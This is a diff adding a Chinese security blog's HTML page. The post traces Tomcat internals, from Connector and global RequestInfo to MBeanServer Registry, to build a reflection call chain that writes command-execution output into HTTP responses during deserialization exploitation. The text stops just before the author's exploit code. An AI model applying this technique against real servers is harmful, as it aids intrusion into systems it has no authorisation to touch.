@@ -1,0 +1,1650 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Lucifaer">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Lucifaer">
+    <meta name="keywords" content="Lucifaer's blog | Lucifaer">
+    <meta name="description" content="Some Lucifaer's security researchers and security analysis">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <meta name="google-site-verification" content="LjYNGqlZPALnNPPyA_Uvw22OVRlDOw2RInQz8sZX-Yk" />
+    <title>Tomcat通用回显学习 · Lucifaer&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180721 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180721 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+        <!-- algolia -->
+        <script>
+            
+            var hits = JSON.parse('{"per_page":10}')
+            var labels = JSON.parse('{"input_placeholder":"Search for Posts","hits_empty":"We did not find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}')
+
+            var algolia = {
+                applicationID: 'K0XKT0INON',
+                apiKey: 'cc8e96eb9aa249bbd7662f7f8f7d70ca',
+                indexName: 'blog',
+                hits: hits,
+                labels: labels
+            }
+        </script>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Lucifaer&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Tomcat通用回显学习</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Lucifaer's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Tomcat通用回显学习
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Java">Java</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Tomcat">Tomcat</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "回显方案">回显方案</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">3,077</span> / Reading time: <span class="post-count">13 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/05/12</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>最近两个月都在写通用的Java漏洞利用框架没怎么跟进最新的技术文章，现在项目终于到了一个较为稳定的阶段终于有时间可以学习一下这两个月中的技术文章了。给我印象比较深刻的是<code>LandGrey</code>、<code>李三</code>、<code>kingkk</code>、<code>Litch1</code>、<code>threedr3am</code>几位师傅对于Tomcat通用回显方式的总结。最开始我没看几位师傅的文章自己调了一下，找到了<code>Litch1</code>、和<code>李三</code>师傅的回显思路，本篇主要用于记录个人的调试学习过程。</p>
+<a id="more"></a>
+<h1 id="0x01-思考"><a href="#0x01-思考" class="headerlink" title="0x01 思考"></a>0x01 思考</h1><p>在寻找解决方案前来思考一下具体的需求是什么，我个人的需求如下：</p>
+<ul>
+<li>以中间件为依托完成回显功能</li>
+<li>兼容所有情况（包括Filter插件，以<code>Shiro</code>为例）</li>
+<li>包含中间件所有版本</li>
+</ul>
+<p>以中间件为依托完成回显功能的优势是：</p>
+<ul>
+<li>跨平台通用</li>
+<li>原生支持性好，不会出现连接中断的现象</li>
+</ul>
+<p>综上，可以看到我们需要一种在Tomcat Filter处理逻辑之前就将执行结果写入返回包的回显方式。</p>
+<p>简单的写一个<code>servlet</code>，看一下Tomcat的调用栈。这里我调试的Tomcat版本为<code>8.5.47</code>，不同的Tomcat版本处理逻辑相同，但是其中的部分数据结构有所改变。</p>
+<p><img src="media/15888311838755/15888314666313.jpg" alt=""></p>
+<p>为了保证类似<code>Shiro</code>这里<code>Filter</code>应用也可以完成回显，就需要在Tomcat执行该<code>Filter</code>之前将执行结果写入<code>response</code>中。所以核心的切入点就是跟踪<code>Http11Processor</code>的前后处理逻辑，尝试获取本次请求，并将结果写入返回包中。</p>
+<h1 id="0x02-寻找利用链"><a href="#0x02-寻找利用链" class="headerlink" title="0x02 寻找利用链"></a>0x02 寻找利用链</h1><p>寻找利用链主要分为两步，获取本次请求、获取返回包。</p>
+<h2 id="2-1-获取返回包"><a href="#2-1-获取返回包" class="headerlink" title="2.1 获取返回包"></a>2.1 获取返回包</h2><p>首先查看<code>Http11Processor</code>处的逻辑：</p>
+<p><img src="media/15888311838755/15888316362579.jpg" alt=""></p>
+<p>主要是调用对应的适配器，并将<code>request</code>和<code>response</code>作为参数传入<code>service()</code>方法中。通过这一部分代码可以得出两点结论：</p>
+<ul>
+<li><code>request</code>和<code>response</code>对象是在此之前就完成初始化的。</li>
+<li>此处使用了适配器模式，证明有多个<code>Processor</code>的执行逻辑是相同的。同时适配器的初始化也是在此前完成的，而适配器的初始化过程中必定存在将本次连接内容保存下来的属性。</li>
+</ul>
+<p>向上跟踪一下<code>request</code>和<code>response</code>对象，发现是在<code>AbstractProcessor</code>抽象类的一个属性，且在构造函数中完成初始化：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890068208490.jpg" alt=""></p>
+<p>而<code>Http11Processor</code>继承于<code>AbstractProcessor</code>，具体的继承树为：</p>
+<p><img src="media/15888311838755/15888318898223.jpg" alt=""></p>
+<p>在<code>Http11Processor</code>的构造方法中调用了父类的构造方法，完成<code>request</code>和<code>response</code>对象的初始化：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890069989955.jpg" alt=""></p>
+<p>ok，目前我们已经知道<code>request</code>和<code>response</code>对象在什么地方完成的初始化，同时也知道了<code>request</code>对象中包含<code>response</code>对象，也就是说我们后面只需要关心如何获取<code>request</code>对象即可。接下来看一下是否有相关的方法可以调用到<code>request</code>这个<code>protected</code>对象：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890093623188.jpg" alt=""></p>
+<p>在<code>AbstractProcessor</code>抽象类中提供了<code>getRequest()</code>方法来获取<code>request</code>对象，同时在<code>Request</code>类中也存在相应的方法获取到<code>Response</code>对象：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890095338231.jpg" alt=""></p>
+<p>如果想要将执行结果写入返回包的包体中，调用<code>Response.doWrite()</code>方法即可，如果想要写到返回包包头中，调用<code>Response.setHeader()</code>方法即可。</p>
+<p>总结一下，目前我们找了获取返回包并写入内容的调用链：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response#doWrite()</span><br></pre></td></tr></table></figure>
+<h2 id="2-2-获取Processor对象"><a href="#2-2-获取Processor对象" class="headerlink" title="2.2 获取Processor对象"></a>2.2 获取Processor对象</h2><p>在2.1中我们已经完成了回显的后半部分即获取<code>Response</code>，并将内容写入的部分，但是如果想要利用这个调用链，我们就必须继续向上跟踪，找到符合本次请求的<code>Http11Processor</code>对象。</p>
+<p>想要寻找本次请求的<code>Http11Processor</code>对象，就需要从<code>Processor</code>对象的初始化看起，具体的初始化代码在<code>ConnectionHandler#process</code>中：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890116078760.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890115687643.jpg" alt=""></p>
+<p><code>connnections</code>对象是<code>ConnectionHandler</code>中定义的一个Map，用于存放<code>socket-processor</code>对象。在这段代码中可以清楚的看到，首次访问时<code>connections</code>中并不存在<code>processor</code>，所以会触发<code>Processor</code>的初始化流程及注册操作。跟进<code>register()</code>方法，查看Tomcat是如何完成<code>Processor</code>注册的。</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890168237122.jpg" alt=""></p>
+<p>这段代码有个非常有意思的地方，我们可以注意到<code>register()</code>方法的关键就是将<code>RequestInfo</code>进行注册，但是在注册前会调用<code>rp.setGlobalProcessor(global);</code>我们来具体看一下<code>global</code>是什么：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15891847561234.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15891847886019.jpg" alt=""></p>
+<p>可以看到<code>RequestGroupInfo</code>类中存在<code>RequestInfo</code>的一个列表，在<code>RequestInfo</code>的<code>setGlobalProcessor()</code>方法中又将<code>RequestInfo</code>对象本身注册到<code>RequestGroupInfo</code>中：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15891855964379.jpg" alt=""></p>
+<p>所以<code>global</code>中所保存的内容和后面调用<code>Registry.registerComponent()</code>方法相同。也就是说有两种思路获取<code>Processor</code>对象：</p>
+<ul>
+<li>寻找获取<code>global</code>的方法</li>
+<li>跟踪<code>Registry.registerComponent()</code>流程，查看具体的<code>RequestInfo</code>对象被注册到什么地方了</li>
+</ul>
+<p>两种方法对应了<code>Litch1</code>和<code>李三</code>师傅的两种获取方式。</p>
+<h3 id="2-2-1-获取global"><a href="#2-2-1-获取global" class="headerlink" title="2.2.1 获取global"></a>2.2.1 获取<code>global</code></h3><p>想要获取<code>global</code>就需要获取到<code>AbstractProtocol</code>，<code>AbstractProtocol</code>实现了<code>ProtocolHandler</code>，也就是说只要能找到获取<code>ProtocolHandler</code>实现类的方法就可以调用<code>AbstractProtocol</code>的<code>ConnectionHandler</code>静态类。依赖树如下：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15891924565603.jpg" alt=""></p>
+<p>所以调用链就变成了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AbstractProtocol$ConnectionHandler -&gt;</span><br><span class="line">global -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response#doWrite()</span><br></pre></td></tr></table></figure>
+<p>到此为止我们已经找到大半部分的调用链了，那如何找到获取<code>ProtocolHandler</code>的方法呢？这需要向下看，看具体调用时是如何触发的。Tomcat使用了<code>Coyote</code>框架来封装底层的socket连接数据，在<code>Coyote</code>框架中包含了核心类<code>ProtocolHandler</code>，主要用于接收<code>socket</code>对象，再交给对应协议的<code>Processor</code>类，最后由<code>Processor</code>类交给实现了<code>Adapter</code>接口的容器。</p>
+<p>在调用栈中也可以看出这一流程：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892471425581.jpg" alt=""></p>
+<p>这里直接跟进一下<code>CoyoteAdapter#service</code>：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892474942710.jpg" alt=""></p>
+<p>这里主要负责将<code>org.apache.coyote.Request</code>和<code>org.apache.coyote.Response</code>转换为<code>org.apache.catalina.connector.Request</code>和<code>org.apache.catalina.connector.Response</code>，如果还未注册为notes，则调用<code>connector</code>的<code>createRequest()</code>和<code>createResponse()</code>方法创建对应的<code>Request</code>和<code>Response</code>对象。</p>
+<p>而关键的调用为：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892478592030.jpg" alt=""></p>
+<p>可以简单的理解一下：<code>CoyoteAdapter</code>通过<code>connector</code>对象来完成后续流程的，也就是说在<code>connector</code>对象中保存着和本次请求有关的所有信息，较为准确的说法是在Tomcat初始化<code>StandardService</code>时，会启动<code>Container</code>、<code>Executor</code>、<code>mapperListener</code>及所有的<code>Connector</code>。其中<code>Executor</code>负责为<code>Connector</code>处理请求提供共用的线程池，<code>mapperListener</code>负责将请求映射到对应的容器中，<code>Connector</code>负责接收和解析请求。所以对于单个请求来说，其相关的信息及调用关系都保存在<code>Connector</code>对象中，从上面的代码中也可以看出一些端倪。所以直接看一下<code>Connection</code>类：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892517959351.jpg" alt=""></p>
+<p>其中有public方法<code>getProtocolHandler()</code>可以直接获得<code>ProtocolHandler</code>。所以调用链就变成了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Connector#getProtocolHandler() -&gt;</span><br><span class="line">AbstractProtocol$ConnectionHandler -&gt;</span><br><span class="line">global -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response#doWrite()</span><br></pre></td></tr></table></figure>
+<p>就如上文所说，<code>Connector</code>是在Tomcat初始化<code>StandardService</code>时完成初始化的，初始化的具体代码在<code>org.apache.catalina.core.StandardService#initInternal</code>：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892520324325.jpg" alt=""></p>
+<p>而在初始化<code>StandardService</code>之前就已经调用<code>org.apache.catalina.startup.Tomcat#setConnector</code>完成<code>Connector</code>设置了：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892526355238.jpg" alt=""></p>
+<p>所以再次梳理一下调用链：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">StandardService -&gt;</span><br><span class="line">Connector#getProtocolHandler() -&gt;</span><br><span class="line">AbstractProtocol$ConnectionHandler -&gt;</span><br><span class="line">global -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response#doWrite()</span><br></pre></td></tr></table></figure>
+<p>最终的问题就是如何获得<code>StandardService</code>了，这里可以利用打破双亲委派的思路，这一点在我写Java攻击框架时用过，就是利用<code>Thread.getCurrentThread().getContextClassLoader()</code>来获取当前线程的<code>ClassLoader</code>，从<code>resources</code>当中寻找即可。</p>
+<p>具体的利用代码这里就不再赘述了，可以直接看<a href="https://github.com/buptchk/ysoserial/" target="_blank" rel="noopener">Litch1师傅分享出的代码</a>。</p>
+<h3 id="2-2-2-从Registry中获取"><a href="#2-2-2-从Registry中获取" class="headerlink" title="2.2.2 从Registry中获取"></a>2.2.2 从Registry中获取</h3><p>其实回顾一下2.2.1中所提到的内容，无非是从<code>Connector</code>入手拿到<code>ProtocolHandler</code>。其实再仔细看一下<code>Connector</code>类的依赖树就可以发现其实所有的参数并非是单独存放在这些类中的一个属性中的，而是都被注册到了<code>MBeanServer</code>中的：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892540185829.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892540343863.jpg" alt=""></p>
+<p>所以其实更加通用的方式就是直接通过<code>MBeanServer</code>来获得这个参数。</p>
+<p>我们在2.2中看到了<code>ConnectionHandler</code>是用<code>Registry.getRegistry(null, null).registerComponent(rp,rpName, null);</code>将<code>RequestInfo</code>注册到<code>MBeanServer</code>中的，那么我们跟进看一下<code>Registry</code>类中有什么方法可以供我们获得<code>MBeanServer</code>，只要拿到了<code>MBeanServer</code>，就可以从其中拿到被注册的<code>RequestInfo</code>对象了。</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892545540421.jpg" alt=""></p>
+<p><code>Registry</code>类中提供了<code>getMBeanServer()</code>方法用于获得（或创建）<code>MBeanServer</code>。在<code>JmxMBeanServer</code>中，其<code>mbsInterceptor</code>对象存放着对应的<code>MBeanServer</code>实例，这个<code>mbsInterceptor</code>对象经过动态调试就是<code>com.sun.jmx.interceptor.DefaultMBeanServerInterceptor</code>。在<code>DefaultMBeanServerInterceptor</code>存在一个<code>Repository</code>属性由于将注册的MBean进行保存，我们这里可以直接使用<code>com.sun.jmx.mbeanserver.Repository#query</code>方法来筛选出所有注册名（其实就是具体的每次请求）包含<code>http-nio-*</code>（*为具体的tomcat端口号）的<code>BaseModelMBean</code>对象：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892687626028.jpg" alt=""></p>
+<p>这里由于测试的关系只存在一个对象，在具体构造时可以直接遍历所有符合条件的情况。其中<code>object.resource.processors</code>中就保存着请求的<code>RequestInfo</code>对象，至此就可以通过<code>RequestInfo</code>对象的<code>req</code>属性来得到请求的<code>Response</code>对象，完成回显。</p>
+<p>总结一下调用链：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Registry.getRegistry(null, null).getMBeanServer() -&gt;</span><br><span class="line">JmxMBeanServer.mbsInterceptor -&gt;</span><br><span class="line">DefaultMBeanServerInterceptor.repository -&gt;</span><br><span class="line">Registory#query -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response#doWrite()</span><br></pre></td></tr></table></figure>
+<h1 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h1><p>具体的调用逻辑在2.2.1和2.2.2中都有总结，总体来说就是用反射一点点完成构造，这里我只罗列2.2.2中的方法，因为2.2.2的方法更为通用，可以经测试在Tomcat7、8、9中都可以使用。需要注意有以下几点：</p>
+<ul>
+<li>Tomcat7及低版本Tomcat8（具体版本没有测试，实验用版本为8.5.9）中，在最终将结果写入Response时需要使用<code>ByteChunk</code>而非<code>ByteBuffer</code></li>
+<li>Tomcat9及高版本Tomcat8（试验用版本为8.5.47）只能使用<code>ByteBuffer</code></li>
+</ul>
+<p>最终的利用代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 